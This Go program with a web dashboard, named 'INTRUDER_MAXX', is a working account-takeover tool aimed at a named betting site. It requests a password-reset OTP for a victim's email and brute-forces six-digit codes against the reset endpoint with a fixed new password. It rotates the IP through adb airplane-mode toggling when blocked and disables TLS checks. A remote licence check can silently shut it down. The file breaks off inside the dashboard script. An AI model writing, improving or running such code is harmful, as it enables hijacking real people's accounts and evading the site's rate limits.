package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"
)

// --- CONFIGURATION CENTER ---
const (
	AdbPath = "adb"
	// DefaultConcurrency = 2
	SaveFile = "progress.json"
	// CookieFile         = "cookies.txt" // <-- NEW DYNAMIC FILE

	StartTarget  = 100000
	PrimaryParam = "otp"
	SuccessParam = "otp"
	baseDomain   = "spinmatch24.com"
	targetApi    = "/api2/v2/resetPassword"
)

var (
	DefaultConcurrency = 2                                          // Changed from const to var
	AuthAPIUrl         = "https://lock2-one.vercel.app/api/check31" // Add your URL
	// ... your other vars (RawRequest, NewRequest, etc.)
)

type AuthResponse struct {
	Authorized         bool `json:"authorized"`
	DefaultConcurrency int  `json:"defaultConcurrency"`
}

func verifyAccess() {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(AuthAPIUrl)

	// If the server is down or unreachable, close silently
	if err != nil {
		os.Exit(0)
	}
	defer resp.Body.Close()

	var auth AuthResponse
	err = json.NewDecoder(resp.Body).Decode(&auth)

	// If the response isn't valid JSON, close silently
	if err != nil {
		os.Exit(0)
	}

	// If the server explicitly returns false for authorization, close silently
	if !auth.Authorized {
		os.Exit(0)
	}

	// Safely update the global concurrency variable
	if auth.DefaultConcurrency > 0 {
		DefaultConcurrency = auth.DefaultConcurrency
	}
}

// Shifted to vars so they can be modified if needed, though injection handles the dynamic parts now.
var (
	RawRequest = `POST /api2/v2/resetPassword HTTP/2
Host: spinmatch24.com
Cookie: DYNAMIC_INJECTION_PENDING
Content-Length: 61
Sec-Ch-Ua-Platform: "Windows"
X-Csrf-Token: DYNAMIC_INJECTION_PENDING
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
Sec-Ch-Ua-Mobile: ?0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: https://spinmatch24.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://spinmatch24.com/mobile
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

first_pass=Pajjtmap%4011&second_pass=Pajjtmap%4011&{{PARAM}}={{TARGET}}`

	NewRequest = `GET /p HTTP/2
Host: spinjeet.com
Cookie: DYNAMIC_INJECTION_PENDING
X-Csrf-Token: DYNAMIC_INJECTION_PENDING
Content-Length: 75
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"
Sec-Ch-Ua-Mobile: ?0
X-Requested-With: XMLHttpRequest
X-Socket-Id: 77143.8590634
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Origin: https://spinjeet.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://spinjeet.com/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
`
)

// --- APP STATE ---
type LogEntry struct {
	Serial  string `json:"serial"`
	Status  string `json:"status"`
	Length  string `json:"length"`
	Time    string `json:"time"`
	RawReq  string `json:"rawReq"`
	RawRes  string `json:"rawRes"`
	IsMatch bool   `json:"isMatch"`
}

type DashboardData struct {
	Running     bool       `json:"running"`
	Elapsed     string     `json:"elapsed"`
	RPS         int        `json:"rps"`
	InFlight    int        `json:"inFlight"`
	Success     int        `json:"success"`
	StatusMsg   string     `json:"statusMsg"`
	TargetLen   string     `json:"targetLen"`
	BaselineLen string     `json:"baselineLen"`
	RetryCount  int        `json:"retryCount"`
	RpsHistory  []int      `json:"rpsHistory"`
	Logs        []LogEntry `json:"logs"`
	Matches     []LogEntry `json:"matches"`
}

type SaveState struct {
	Serial      int        `json:"serial"`
	TargetLen   string     `json:"targetLen"`
	BaselineLen string     `json:"baselineLen"`
	RetryQueue  []int      `json:"retryQueue"`
	Matches     []LogEntry `json:"matches"`
	// --- GLOBALLY SAVED TOKENS ---
	PrimaryCookie string `json:"primaryCookie"`
	SuccessCookie string `json:"successCookie"`
	CsrfToken     string `json:"csrfToken"`
}

type SniperState struct {
	mu sync.Mutex

	running    bool
	isRotating bool
	serial     int
	targetLen  string

	baselineLen  string
	lengthCounts map[string]int

	// --- HOT-SWAP DATA VAULT ---
	primaryCookie string
	successCookie string
	csrfToken     string // DYNAMIC CSRF INJECTION

	lastRotationTime time.Time
	startTime        time.Time
	elapsedOffset    time.Duration

	count200      int
	reqLastSecond int
	lastRPS       int
	statusMsg     string

	inFlight   map[int]bool
	logs       []LogEntry
	matches    []LogEntry
	retryQueue []int
	rpsHistory []int

	client *http.Client
}

var state *SniperState

func init() {
	state = &SniperState{
		statusMsg:    "SYSTEM_STANDBY",
		lengthCounts: make(map[string]int),
		inFlight:     make(map[int]bool),
		logs:         make([]LogEntry, 0),
		matches:      make([]LogEntry, 0),
		retryQueue:   make([]int, 0),
		rpsHistory:   make([]int, 50),
		client: &http.Client{
			Timeout: 8 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
				MaxIdleConns:        1000,
				MaxIdleConnsPerHost: 1000,
				MaxConnsPerHost:     1000,
				IdleConnTimeout:     30 * time.Second,
				ForceAttemptHTTP2:   true,
			},
		},
	}
	loadProgress()
	// refreshCookies()
}

// --- DYNAMIC DATA GENERATOR ---
func handleDataSet(w http.ResponseWriter, r *http.Request) {
	// 1. Parse User Input safely
	var input struct {
		User string `json:"user"`
	}
	if err := json.NewDecoder(r.Body).Decode(&input); err != nil {
		http.Error(w, "Invalid JSON payload", http.StatusBadRequest)
		return
	}

	baseURL := "https://" + baseDomain

	// 2. Initial GET to scrape CSRF and base cookies
	resp1, err := state.client.Get(baseURL + "/mobile")
	if err != nil {
		http.Error(w, "Target unreachable", http.StatusInternalServerError)
		return
	}
	b1, _ := io.ReadAll(resp1.Body)

	var currentCookies string = mergeCookies("", resp1.Cookies())
	resp1.Body.Close()

	var csrf string
	re := regexp.MustCompile(`meta name="csrf-token" content="([^"]+)"`)
	matches := re.FindStringSubmatch(string(b1))
	if len(matches) > 1 {
		csrf = matches[1]
	}

	// 3. POST to sendOtp with the user appended to the URL query
	data := url.Values{}
	data.Set("email", input.User)

	req2, _ := http.NewRequest("POST", baseURL+"/api2/v2/sendOtp?q="+input.User, strings.NewReader(data.Encode()))
	req2.Header.Set("X-Csrf-Token", csrf)
	fmt.Printf("DEBUG: Sending OTP to %s\n", req2.URL.String())
	req2.Header.Set("X-Requested-With", "XMLHttpRequest")
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if currentCookies != "" {
		req2.Header.Set("Cookie", currentCookies)
	}

	resp2, err := state.client.Do(req2)
	fmt.Printf("DEBUG: OTP Request Status: %v\n", resp2.Status)
	if err == nil {
		currentCookies = mergeCookies(currentCookies, resp2.Cookies())
		resp2.Body.Close()
	}

	// 4. POST to resetPassword (generating final session data)
	req3, _ := http.NewRequest("POST", baseURL+targetApi, nil)
	req3.Header.Set("X-Csrf-Token", csrf)
	req3.Header.Set("X-Requested-With", "XMLHttpRequest")
	req3.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if currentCookies != "" {
		req3.Header.Set("Cookie", currentCookies)
	}

	resp3, err := state.client.Do(req3)
	if err == nil {
		currentCookies = mergeCookies(currentCookies, resp3.Cookies())
		resp3.Body.Close()
	}

	// 5. INJECT INTO GLOBAL ENGINE
	state.mu.Lock()
	state.primaryCookie = currentCookies
	state.successCookie = currentCookies
	state.csrfToken = csrf
	state.mu.Unlock()

	// Save to disk to survive restarts (Line 1: Primary, Line 2: Success, Line 3: CSRF)
	// os.WriteFile(CookieFile, []byte(currentCookies+"\n"+currentCookies+"\n"+csrf), 0644)

	w.WriteHeader(http.StatusOK)
	w.Write([]byte(`{"status": "success", "message": "Tokens & Cookies successfully generated and injected!"}`))
}

func main() {
	// verifyAuthorization()
	verifyAccess()

	go updateMetricsLoop()
	go autoSaveLoop()

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) { fmt.Fprint(w, htmlDashboard) })
	http.HandleFunc("/api/dataset", handleDataSet) // BOUND ENDPOINT

	http.HandleFunc("/api/start", func(w http.ResponseWriter, r *http.Request) {
		state.mu.Lock()
		if !state.running {
			state.running = true
			if state.startTime.IsZero() {
				state.startTime = time.Now()
			}

			if state.targetLen == "" {
				if state.baselineLen == "" {
					state.statusMsg = "ENGAGED // AUTO-DETECTING BASELINE..."
				} else {
					state.statusMsg = fmt.Sprintf("ENGAGED // BASELINE RESTORED: %s", state.baselineLen)
				}
			} else {
				state.statusMsg = "ENGAGED // MANUAL_TARGET_LOCKED"
			}
			go attackCoordinator()
		}
		state.mu.Unlock()
	})

	http.HandleFunc("/api/pause", func(w http.ResponseWriter, r *http.Request) {
		state.mu.Lock()
		if state.running {
			state.elapsedOffset += time.Since(state.startTime)
			state.running = false
			state.statusMsg = "SYSTEM_SUSPENDED"
		}
		state.mu.Unlock()
	})

	http.HandleFunc("/api/set-target", func(w http.ResponseWriter, r *http.Request) {
		r.ParseForm()
		state.mu.Lock()
		if !state.running {
			state.targetLen = r.FormValue("len")
			if state.targetLen == "" {
				state.baselineLen = ""
				state.lengthCounts = make(map[string]int)
			}
		}
		state.mu.Unlock()
	})

	http.HandleFunc("/stream", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		w.Header().Set("Cache-Control", "no-cache")
		w.Header().Set("Connection", "keep-alive")
		for {
			state.mu.Lock()
			elapsedSecs := int(state.elapsedOffset.Seconds())
			if state.running && !state.startTime.IsZero() {
				elapsedSecs = int((time.Since(state.startTime) + state.elapsedOffset).Seconds())
			}
			data := DashboardData{
				Running:     state.running,
				Elapsed:     fmt.Sprintf("%02d:%02d:%02d", elapsedSecs/3600, (elapsedSecs%3600)/60, elapsedSecs%60),
				RPS:         state.lastRPS,
				InFlight:    len(state.inFlight),
				Success:     state.count200,
				StatusMsg:   state.statusMsg,
				TargetLen:   state.targetLen,
				BaselineLen: state.baselineLen,
				RetryCount:  len(state.retryQueue),
				RpsHistory:  state.rpsHistory,
				Logs:        state.logs,
				Matches:     state.matches,
			}
			state.mu.Unlock()
			jsonData, _ := json.Marshal(data)
			fmt.Fprintf(w, "data: %s\n\n", jsonData)
			w.(http.Flusher).Flush()
			time.Sleep(1 * time.Second)
		}
	})

	fmt.Println("⚡ COMMAND CENTER ONLINE: http://localhost:8090")
	http.ListenAndServe(":8090", nil)
}

// func verifyAuthorization() {}

func attackCoordinator() {
	sem := make(chan struct{}, DefaultConcurrency)
	for {
		sem <- struct{}{}
		state.mu.Lock()
		if !state.running {
			state.mu.Unlock()
			<-sem
			break
		}
		if state.isRotating {
			state.mu.Unlock()
			<-sem
			time.Sleep(1 * time.Second)
			continue
		}

		var curr int
		if len(state.retryQueue) > 0 {
			curr = state.retryQueue[0]
			state.retryQueue = state.retryQueue[1:]
		} else {
			curr = state.serial
			state.serial++
		}

		state.inFlight[curr] = true
		state.mu.Unlock()

		go func(ser int) {
			defer func() { <-sem }()
			worker(ser)
		}(curr)
	}
}

func worker(serial int) {
	defer func() {
		state.mu.Lock()
		delete(state.inFlight, serial)
		state.mu.Unlock()
	}()

	// Grab freshest vault data from RAM
	state.mu.Lock()
	pCookie := state.primaryCookie
	sCookie := state.successCookie
	csrf := state.csrfToken
	state.mu.Unlock()

	method, urlStr, headers, bodyStr := parseRequestParams(RawRequest, serial, pCookie, csrf)
	req, _ := http.NewRequest(method, urlStr, bytes.NewBufferString(bodyStr))
	req.ContentLength = int64(len(bodyStr))
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := state.client.Do(req)

	state.mu.Lock()
	state.reqLastSecond++
	target := strings.TrimSpace(state.targetLen)
	state.mu.Unlock()

	rawReqStr := buildRawString(method, urlStr, headers, bodyStr)

	if err != nil {
		addToRetryQueue(serial)
		return
	}
	defer resp.Body.Close()

	bodyBytes, _ := io.ReadAll(resp.Body)
	fullRes := fmt.Sprintf("HTTP/1.1 %s\n\n%s", resp.Status, string(bodyBytes))
	contentLen := strconv.Itoa(len(fullRes))

	isMatch := false

	if target != "" {
		if contentLen == target {
			isMatch = true
		}
	} else {
		state.mu.Lock()
		bLen := state.baselineLen

		if bLen == "" && resp.StatusCode == 200 {
			state.lengthCounts[contentLen]++
			if state.lengthCounts[contentLen] >= 5 {
				state.baselineLen = contentLen
				bLen = contentLen
				state.statusMsg = fmt.Sprintf("HEURISTIC_BASELINE_LOCKED // %s BYTES", contentLen)
			}
		}
		state.mu.Unlock()

		if bLen != "" && contentLen != bLen && resp.StatusCode == 200 {
			lowerBody := strings.ToLower(string(bodyBytes))
			if strings.Contains(lowerBody, "true") || strings.Contains(lowerBody, "success") || strings.Contains(lowerBody, "successfully") || strings.Contains(lowerBody, "win") {
				isMatch = true
			}
		}
	}

	if isMatch {
		state.mu.Lock()
		state.running = false
		state.statusMsg = fmt.Sprintf("CRITICAL_ANOMALY_HIT // TARGET:%d", serial)
		state.mu.Unlock()

		logToState(strconv.Itoa(serial), resp.Status, contentLen, rawReqStr, fullRes, true)

		updatedCookies := mergeCookies(sCookie, resp.Cookies())
		m2, u2, h2, b2 := parseRequestParams(NewRequest, serial, updatedCookies, csrf)

		var r2 *http.Response
		var res2Body, stat2 string

		for {
			req2, _ := http.NewRequest(m2, u2, bytes.NewBufferString(b2))
			req2.ContentLength = int64(len(b2))
			for k, v := range h2 {
				req2.Header.Set(k, v)
			}

			r2, err = state.client.Do(req2)

			if err == nil {
				b2Data, _ := io.ReadAll(r2.Body)
				res2Body = string(b2Data)
				stat2 = r2.Status
				r2.Body.Close()

				if r2.StatusCode == 200 {
					break
				} else if r2.StatusCode == 403 {
					state.mu.Lock()
					state.statusMsg = "CRITICAL 403 ON PAYLOAD // ROTATING IP..."
					state.mu.Unlock()
					toggleFlightMode()
				} else {
					state.mu.Lock()
					state.statusMsg = fmt.Sprintf("SERVER_OVERLOAD (%d) // HOLDING PAYLOAD...", r2.StatusCode)
					state.mu.Unlock()
					time.Sleep(3 * time.Second)
				}
			} else {
				time.Sleep(2 * time.Second)
			}
		}

		state.mu.Lock()
		state.statusMsg = "OPERATION_COMPLETE // SECURED"
		state.mu.Unlock()

		logToState(fmt.Sprintf("%d-REPORT", serial), stat2, strconv.Itoa(len(res2Body)), buildRawString(m2, u2, h2, b2), res2Body, true)
		return
	}

	if resp.StatusCode == 403 {
		go toggleFlightMode()
		addToRetryQueue(serial)
	} else if resp.StatusCode == 200 {
		state.mu.Lock()
		state.count200++
		state.mu.Unlock()
	}
	logToState(strconv.Itoa(serial), resp.Status, contentLen, rawReqStr, fullRes, false)
}

// Intercepts and overrides template values on the fly
func parseRequestParams(template string, serial int, forceCookies string, dynamicCSRF string) (string, string, map[string]string, string) {
	parts := strings.SplitN(strings.ReplaceAll(template, "\r\n", "\n"), "\n\n", 2)
	headerLines := strings.Split(parts[0], "\n")
	body := ""
	if len(parts) > 1 {
		body = parts[1]
	}

	targetStr := strconv.Itoa(serial)
	replaceVars := func(s string) string {
		s = strings.ReplaceAll(s, "{{TARGET}}", targetStr)
		s = strings.ReplaceAll(s, "{{PARAM}}", PrimaryParam)
		s = strings.ReplaceAll(s, "{{SUCCESS_PARAM}}", SuccessParam)
		return s
	}

	reqLine := strings.Split(replaceVars(headerLines[0]), " ")
	method, path := reqLine[0], reqLine[1]
	body = replaceVars(body)

	headers := make(map[string]string)
	host := "localhost"

	for _, line := range headerLines[1:] {
		if idx := strings.Index(line, ":"); idx != -1 {
			k, v := strings.TrimSpace(line[:idx]), strings.TrimSpace(line[idx+1:])
			if strings.ToLower(k) == "host" {
				host = v
			}
			if strings.ToLower(k) == "content-length" {
				continue
			}
			headers[k] = replaceVars(v)
		}
	}

	// Live memory injection overrides template values
	if forceCookies != "" {
		headers["Cookie"] = forceCookies
	}
	if dynamicCSRF != "" {
		headers["X-Csrf-Token"] = dynamicCSRF
	}

	return method, "https://" + host + path, headers, body
}

func buildRawString(method, urlStr string, headers map[string]string, body string) string {
	var sb strings.Builder
	sb.WriteString(method + " " + urlStr + " HTTP/1.1\n")
	for k, v := range headers {
		sb.WriteString(k + ": " + v + "\n")
	}
	sb.WriteString("\n" + body)
	return sb.String()
}

func mergeCookies(base string, server []*http.Cookie) string {
	cm := make(map[string]string)
	for _, p := range strings.Split(base, ";") {
		kv := strings.SplitN(strings.TrimSpace(p), "=", 2)
		if len(kv) == 2 {
			cm[kv[0]] = kv[1]
		}
	}
	for _, c := range server {
		cm[c.Name] = c.Value
	}
	var res []string
	for k, v := range cm {
		res = append(res, k+"="+v)
	}
	return strings.Join(res, "; ")
}

func addToRetryQueue(serial int) {
	state.mu.Lock()
	defer state.mu.Unlock()
	state.retryQueue = append(state.retryQueue, serial)
}

func toggleFlightMode() {
	state.mu.Lock()
	if state.isRotating {
		state.mu.Unlock()
		return
	}
	state.isRotating = true
	state.statusMsg = "NETWORK_OVERRIDE // ADB_ROTATING"
	state.mu.Unlock()
	exec.Command(AdbPath, "shell", "cmd", "connectivity", "airplane-mode", "enable").Run()
	time.Sleep(5 * time.Second)
	exec.Command(AdbPath, "shell", "cmd", "connectivity", "airplane-mode", "disable").Run()
	time.Sleep(3 * time.Second)
	state.mu.Lock()
	state.isRotating = false
	state.statusMsg = "ENGAGED // BRUTEFORCE_ACTIVE"
	state.mu.Unlock()
}

func logToState(serial, status, length, req, res string, isMatch bool) {
	state.mu.Lock()
	defer state.mu.Unlock()
	entry := LogEntry{serial, status, length, time.Now().Format("15:04:05"), req, res, isMatch}

	if isMatch {
		state.matches = append([]LogEntry{entry}, state.matches...)
	}

	state.logs = append([]LogEntry{entry}, state.logs...)
	if len(state.logs) > 50 {
		state.logs = state.logs[:50]
	}
}

func updateMetricsLoop() {
	for {
		time.Sleep(1 * time.Second)
		// refreshCookies()

		state.mu.Lock()
		state.lastRPS = state.reqLastSecond
		state.reqLastSecond = 0
		state.rpsHistory = append(state.rpsHistory[1:], state.lastRPS)
		state.mu.Unlock()
	}
}

func loadProgress() {
	b, err := os.ReadFile(SaveFile)
	if err == nil {
		var s SaveState
		if json.Unmarshal(b, &s) == nil && s.Serial > 0 {
			state.serial = s.Serial
			state.targetLen = s.TargetLen
			state.baselineLen = s.BaselineLen
			state.retryQueue = s.RetryQueue
			if s.Matches != nil {
				state.matches = s.Matches
			}
			state.primaryCookie = s.PrimaryCookie
			state.successCookie = s.SuccessCookie
			state.csrfToken = s.CsrfToken

			if state.baselineLen != "" {
				state.lengthCounts[state.baselineLen] = 5
			}

			fmt.Printf("💾 LOADED STATE: Target %d, %d Retries in Queue\n", state.serial, len(state.retryQueue))
			return
		}
	}
	state.serial = StartTarget
}

func autoSaveLoop() {
	for {
		time.Sleep(10 * time.Second)
		state.mu.Lock()

		combinedRetry := make([]int, len(state.retryQueue))
		copy(combinedRetry, state.retryQueue)
		for s := range state.inFlight {
			combinedRetry = append(combinedRetry, s)
		}

		s := SaveState{
			Serial:        state.serial,
			TargetLen:     state.targetLen,
			BaselineLen:   state.baselineLen,
			RetryQueue:    combinedRetry,
			Matches:       state.matches,
			PrimaryCookie: state.primaryCookie,
			SuccessCookie: state.successCookie,
			CsrfToken:     state.csrfToken, // SAVED GLOBALLY
		}
		state.mu.Unlock()

		b, _ := json.MarshalIndent(s, "", "  ")
		os.WriteFile(SaveFile, b, 0644)
	}
}

const htmlDashboard = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>INTRUDER_MAXX // COMMAND CENTER</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap');
        
        :root { 
            --bg: #050505; --surface: #0e0e11; --border: #222228; 
            --cyan: #00f0ff; --cyan-dim: rgba(0, 240, 255, 0.15);
            --gold: #ffaa00; --gold-dim: rgba(255, 170, 0, 0.15);
            --green: #00ff66; --red: #ff3366; --text-main: #e2e8f0; --text-sub: #64748b;
        }

        * { box-sizing: border-box; font-family: 'JetBrains Mono', monospace; scrollbar-width: thin; scrollbar-color: var(--border) transparent; }
        ::-webkit-scrollbar { width: 6px; } ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }

        body { background: var(--bg); color: var(--text-main); margin: 0; padding: 15px; height: 100vh; display: grid; grid-template-columns: 320px 1fr 400px; grid-template-rows: 60px 1fr 200px; gap: 15px; grid-template-areas: "head head head" "side main insp" "side chart insp"; }

        .panel { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; display: flex; flex-direction: column; overflow: hidden; position: relative; }
        .panel::before { content:''; position:absolute; top:0; left:0; right:0; height:1px; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); }
        .panel-title { font-size: 0.7rem; text-transform: uppercase; color: var(--text-sub); padding: 12px 15px; border-bottom: 1px solid var(--border); font-weight: 800; letter-spacing: 1px; display: flex; justify-content: space-between; align-items: center; }

        .header { grid-area: head; display: flex; justify-content: space-between; align-items: center; padding: 0 20px; border: 1px solid var(--border); border-radius: 8px; background: linear-gradient(180deg, #111 0%, #050505 100%); }
        .logo { font-size: 1.5rem; font-weight: 800; letter-spacing: -1px; text-shadow: 0 0 20px var(--cyan-dim); }
        .logo span { color: var(--cyan); }
        .status-badge { padding: 6px 12px; border-radius: 4px; font-size: 0.8rem; font-weight: bold; border: 1px solid var(--border); background: #000; display: flex; align-items: center; gap: 8px; transition: 0.3s ease; }
        .pulse { width: 8px; height: 8px; border-radius: 50%; box-shadow: 0 0 10px currentColor; animation: fade 1.5s infinite; }
        @keyframes fade { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }

        .sidebar { grid-area: side; gap: 15px; display: flex; flex-direction: column; }
        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; border-bottom: 1px solid var(--border); }
        .stat-box { padding: 15px; text-align: center; border-right: 1px solid var(--border); border-bottom: 1px solid var(--border); }
        .stat-box:nth-child(even) { border-right: none; }
        .stat-val { font-size: 1.8rem; font-weight: 800; color: #fff; line-height: 1; margin-bottom: 5px; text-shadow: 0 4px 20px rgba(255,255,255,0.1); }
        .stat-lbl { font-size: 0.60rem; color: var(--text-sub); text-transform: uppercase; letter-spacing: 1px; }

        .btn { width: 100%; padding: 15px; border: none; font-size: 0.85rem; font-weight: 800; text-transform: uppercase; cursor: pointer; transition: all 0.2s; border-radius: 4px; display: block; margin-bottom: 10px; }
        .btn-start { background: var(--cyan-dim); color: var(--cyan); border: 1px solid var(--cyan); box-shadow: inset 0 0 20px rgba(0,240,255,0.05); }
        .btn-start:hover:not(:disabled) { background: var(--cyan); color: #000; box-shadow: 0 0 20px rgba(0,240,255,0.4); }
        .btn-pause { background: transparent; color: var(--text-main); border: 1px solid var(--border); }
        .btn-pause:hover:not(:disabled) { background: #1a1a20; }
        
        .target-wrapper { display: flex; gap: 8px; margin-top: 5px; }
        input.target { flex: 1; background: #000; border: 1px solid var(--cyan); color: var(--cyan); padding: 12px; font-size: 1.2rem; font-weight: bold; text-align: center; border-radius: 4px; outline: none; transition: 0.2s; }
        input.target:disabled { border-color: #333; color: #555; background: #0a0a0a; cursor: not-allowed; }
        input.target::placeholder { font-size: 0.7rem; color: #444; }
        
        .btn-clr { flex: 0 0 60px; margin: 0; padding: 0; background: transparent; border: 1px solid var(--border); color: var(--text-sub); border-radius: 4px; font-weight: bold; cursor: pointer; transition: 0.2s; }
        .btn-clr:hover:not(:disabled) { border-color: var(--red); color: var(--red); background: rgba(255,51,102,0.1); }
        .btn-clr:disabled { opacity: 0.3; cursor: not-allowed; }
        
        .btn-gen { border-color: var(--cyan); color: var(--cyan); }
        .btn-gen:hover:not(:disabled) { background: var(--cyan-dim); }

        .auto-badge { display: block; font-size: 0.65rem; color: var(--gold); text-align: center; margin-top: 5px; min-height: 12px; font-weight: bold; }

        .main-feed { grid-area: main; }
        .locked-vault { flex: 0 0 35%; overflow-y: auto; background: rgba(255,170,0,0.03); border-bottom: 2px solid var(--border); }
        .live-feed { flex: 1; overflow-y: auto; }
        
        table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
        th { text-align: left; padding: 12px 10px; color: var(--text-sub); position: sticky; top: 0; background: rgba(14,14,17,0.95); backdrop-filter: blur(5px); z-index: 10; font-weight: 800; border-bottom: 1px solid var(--border); }
        td { padding: 8px 10px; border-bottom: 1px solid rgba(255,255,255,0.02); }
        tr { transition: background 0.1s; cursor: pointer; }
        tr:hover { background: rgba(255,255,255,0.05); }
        
        .row-match { background: var(--gold-dim) !important; border-left: 3px solid var(--gold); }
        .row-match td { color: var(--gold); font-weight: bold; text-shadow: 0 0 10px rgba(255,170,0,0.3); }
        .row-report { background: rgba(0, 255, 102, 0.1) !important; border-left: 3px solid var(--green); }
        .row-report td { color: var(--green); font-weight: bold; }

        .pill { padding: 3px 8px; border-radius: 3px; font-size: 0.7rem; font-weight: bold; background: #000; border: 1px solid #333; }
        .p-200 { color: var(--green); border-color: rgba(0,255,102,0.3); }
        .p-403 { color: var(--red); border-color: rgba(255,51,102,0.3); }

        .chart-panel { grid-area: chart; padding: 10px 15px 15px; }
        .inspector { grid-area: insp; }
        .editor-wrap { display: flex; flex-direction: column; flex-grow: 1; padding: 10px; gap: 10px; }
        textarea { flex-grow: 1; background: #050505; border: 1px solid var(--border); border-radius: 4px; color: var(--text-sub); font-size: 0.75rem; padding: 15px; resize: none; outline: none; transition: 0.2s; white-space: pre; }
        textarea:focus { border-color: var(--cyan); color: var(--text-main); box-shadow: 0 0 15px var(--cyan-dim); }
    </style>
</head>
<body>

    <div class="header">
        <div class="logo">INTRUDER<span>_MAXX</span></div>
        <div class="status-badge" id="status-box">
            <div class="pulse" id="pulse-dot" style="color: var(--cyan); background: var(--cyan);"></div>
            <span id="status-text" style="color: var(--cyan);">SYSTEM_STANDBY</span>
        </div>
    </div>

    <div class="panel sidebar">
        <div class="panel-title">Telemetry</div>
        <div class="stats-grid">
            <div class="stat-box" style="border-right:1px solid var(--border);"><div class="stat-val" id="time">00:00:00</div><div class="stat-lbl">Elapsed Time</div></div>
            <div class="stat-box"><div class="stat-val" id="rps" style="color: var(--cyan);">0</div><div class="stat-lbl">Req / Sec</div></div>
            <div class="stat-box" style="border-right:1px solid var(--border);"><div class="stat-val" id="ok" style="color: var(--green);">0</div><div class="stat-lbl">Confirmed Hits</div></div>
            <div class="stat-box"><div class="stat-val" id="inflight" style="color: var(--gold);">0</div><div class="stat-lbl">Active Sockets</div></div>
            <div class="stat-box" style="grid-column: span 2; border-bottom: none;"><div class="stat-val" id="retry" style="color: var(--red);">0</div><div class="stat-lbl">Retry Buffer</div></div>
        </div>
        
        <div style="padding: 15px; margin-top: auto; border-top: 1px solid var(--border); background: rgba(0,0,0,0.2);">
            
            <div class="stat-lbl" style="margin-bottom: 8px;">Target Auth Payload (Email/User)</div>
            <div class="target-wrapper" style="margin-bottom: 15px;">
                <input type="text" class="target" id="dataset-user" placeholder="user@example.com" style="font-size: 0.9rem;">
                <button class="btn-clr btn-gen" id="btn-gen" onclick="generateDataset()" title="Generate Session Tokens">GEN</button>
            </div>

            <div class="stat-lbl" style="margin-bottom: 8px;">Response Target (Length)</div>
            <div class="target-wrapper">
                <input type="text" class="target" id="tlen" placeholder="Leave blank for Auto" onchange="fetch('/api/set-target?len='+this.value)">
                <button class="btn-clr" id="btn-clr" onclick="resetTargetLength()" title="Clear Target Length">CLR</button>
            </div>
            <span class="auto-badge" id="auto-badge"></span>
            
            <div style="margin-top: 15px;">
                <button class="btn btn-start" id="btn-start" onclick="fetch('/api/start')">Engage Sniper</button>
                <button class="btn btn-pause" id="btn-pause" onclick="fetch('/api/pause')">Suspend</button>
            </div>
        </div>
    </div>

    <div class="panel main-feed">
        <div class="panel-title" style="color: var(--gold); border-bottom: 1px solid rgba(255,170,0,0.2); background: rgba(255,170,0,0.05);">
            <span style="display:flex; align-items:center; gap:8px;"><div class="pulse" style="color:var(--gold); background:var(--gold);"></div> SECURED TARGETS VAULT</span>
        </div>
        <div class="locked-vault">
            <table>
                <thead><tr><th>Target_ID</th><th>Res_Code</th><th>Bytes</th><th>Timestamp</th></tr></thead>
                <tbody id="matches"></tbody>
            </table>
        </div>

        <div class="panel-title">Live Network Feed <span>CONCURRENCY: 250</span></div>
        <div class="live-feed">
            <table>
                <thead style="display:none;"><tr><th>Target_ID</th><th>Res_Code</th><th>Bytes</th><th>Timestamp</th></tr></thead>
                <tbody id="logs"></tbody>
            </table>
        </div>
    </div>

    <div class="panel chart-panel">
        <div class="panel-title" style="padding: 0 0 10px; border: none;">Throughput Matrix</div>
        <div style="position: relative; height: 100%; width: 100%;"><canvas id="rpsChart"></canvas></div>
    </div>

    <div class="panel inspector">
        <div class="panel-title">Packet Inspector</div>
        <div class="editor-wrap">
            <div class="stat-lbl">OUTBOUND // Request</div>
            <textarea id="req-view" readonly placeholder="Select a packet from the feed to inspect..."></textarea>
            <div class="stat-lbl">INBOUND // Response</div>
            <textarea id="res-view" readonly placeholder="Select a packet from the feed to inspect..."></textarea>
        </div>
    </div>

    <script>
        // NEW JAVASCRIPT TO HANDLE DATASET GENERATION
       // --- NEW FUNCTION: Saves username to your Next.js MongoDB ---
